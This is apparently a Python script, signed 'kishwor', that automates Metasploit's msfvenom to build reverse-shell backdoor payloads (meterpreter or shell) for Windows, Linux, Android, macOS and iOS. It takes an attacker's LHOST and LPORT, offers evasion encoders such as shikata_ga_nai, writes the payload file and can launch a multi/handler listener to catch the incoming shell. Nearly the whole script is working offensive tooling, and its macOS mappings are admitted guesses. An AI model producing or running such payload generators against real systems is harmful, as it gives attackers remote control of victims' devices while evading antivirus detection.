import os

print(""" kishwor """)

# Prompt user to choose target operating system
print("Choose target operating system:")
print("1. Windows")
print("2. Linux")
print("3. Android")
print("4. macOS")
print("5. iOS")

choice = input("Enter your choice: ")

# Prompt user to choose payload type
print("Choose payload type:")
print("1. Staged Reverse TCP")
print("2. Staged Reverse HTTP")
print("3. Staged Reverse HTTPS")
print("4. Non-staged Reverse TCP")
print("5. Non-staged Reverse HTTP")
print("6. Non-staged Reverse HTTPS")

payload_type = input("Enter your choice: ")

# Map choices to payloads
payloads = {
    "1": {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "windows/meterpreter/reverse_http",
        "3": "windows/meterpreter/reverse_https",
        "4": "windows/meterpreter_reverse_tcp",
        "5": "windows/meterpreter_reverse_http",
        "6": "windows/meterpreter_reverse_https"
    },
    "2": {
        "1": "linux/x86/meterpreter/reverse_tcp",
        "2": "linux/x86/meterpreter/reverse_http",
        "3": "linux/x86/meterpreter/reverse_https",
        "4": "linux/x86/meterpreter_reverse_tcp",
        "5": "linux/x86/meterpreter_reverse_http",
        "6": "linux/x86/meterpreter_reverse_https"
    },
    "3": {
        "1": "android/meterpreter/reverse_tcp",
        "2": "android/meterpreter/reverse_http",
        "3": "android/meterpreter/reverse_https",
        "4": "android/meterpreter_reverse_tcp",
        "5": "android/meterpreter_reverse_http",
        "6": "android/meterpreter_reverse_https"
    },
    "4": {
        "1": "osx/x86/shell_reverse_tcp",
        "2": "osx/x86/shell_reverse_http",
        "3": "osx/x86/shell_reverse_https",
        "4": "osx/x86/shell_reverse_tcp",  # Assuming this is non-staged for macOS, adjust as needed
        "5": "osx/x86/shell_reverse_http",  # Assuming non-staged reverse HTTP for macOS
        "6": "osx/x86/shell_reverse_https"  # Assuming non-staged reverse HTTPS for macOS
    },
    "5": {
        "1": "ios/meterpreter/reverse_tcp",
        "2": "ios/meterpreter/reverse_http",
        "3": "ios/meterpreter/reverse_https",
        "4": "ios/meterpreter_reverse_tcp",
        "5": "ios/meterpreter_reverse_http",
        "6": "ios/meterpreter_reverse_https"
    }
}

# Determine payload and file format based on choices
file_formats = {
    "1": "exe",
    "2": "elf",
    "3": "raw",  # Keep file format as raw for Android
    "4": "app",
    "5": "ipa"
}

# Check for valid choices
if choice in payloads and payload_type in payloads[choice]:
    payload = payloads[choice][payload_type]
    file_format = file_formats[choice]
else:
    print("Invalid choice")
    exit()

# Prompt user for lhost, lport, and payload name
lhost = input("Enter lhost: ")
lport = input("Enter lport: ")
payload_name = input("Enter payload name: ")

# Set file name based on payload name and file format
if choice == "3":  # Android case
    file_name = f"{payload_name}.apk"  # Use .apk extension
else:
    file_name = f"{payload_name}.{file_format}"  # Use appropriate extension for other OS

# Prompt user to specify whether to use encoding
use_encoding = input("Use encoding? (y/n) ")

encode_flag = ""
if use_encoding.lower() == "y":
    # Prompt user to choose encoding type
    print("Choose encoding type:")
    print("1. x86/shikata_ga_nai")
    print("2. cmd/powershell_base64")
    print("3. x86/xor_dynamic")
    print("4. x86/call4_dword_xor")
    print("5. x86/unicode_mixed")

    encoding_choice = input("Enter your choice: ")

    encodings = {
        "1": "x86/shikata_ga_nai",
        "2": "cmd/powershell_base64",
        "3": "x86/xor_dynamic",
        "4": "x86/call4_dword_xor",
        "5": "x86/unicode_mixed"
    }

    if encoding_choice in encodings:
        encode_flag = f"-e {encodings[encoding_choice]}"
    else:
        print("Invalid encoding choice")
        exit()

# Generate payload using msfvenom
os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {encode_flag} -f {file_format} -o {file_name}")

# Prompt user to start reverse multi handler in Metasploit
start_handler = input("Start reverse multi handler in Metasploit? (y/n) ")

if start_handler.lower() == "y":
    os.system(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'")

